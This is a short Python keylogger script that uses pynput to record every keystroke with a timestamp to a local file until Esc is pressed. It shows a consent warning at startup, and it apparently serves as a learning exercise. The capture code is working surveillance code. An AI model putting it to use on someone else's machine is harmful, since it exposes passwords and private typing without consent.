#This project logs keystrokes and save them to a file while ensuring ethical considerations like user consent and security measures
from pynput import keyboard         #captures keyboard input
import logging          #saves keystrokes to a file
import os

#Define the log file path
log_file = "key_log.txt"

#Ensure user permission before running
print("Warning: This script logs key strokes. Use only with consent." )
input("Press Enter to continue...")

#Configure logging to store keystrokes
logging.basicConfig(filename=log_file, level=logging.DEBUG, format="%(asctime)s - %(message)s")

#Define the key press handler
def on_press(key):
    try:
        #log normal keys
        if hasattr(key, 'char') and key.char is not None:
            logging.info(f"Key pressed: {key.char}")
        else:
            #log special keys such as Enter, Shift
            logging.info(f"Special key pressed: {key}")
    except Exception as e:
        logging.error(f"Error: {e}")

#Define the key release handler
def on_release(key):
    if key == keyboard.Key.esc:
        print("\n[INFO] Exiting Key Logger...")
        return False #Stops the listener
    
#Start listening for key strokes
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()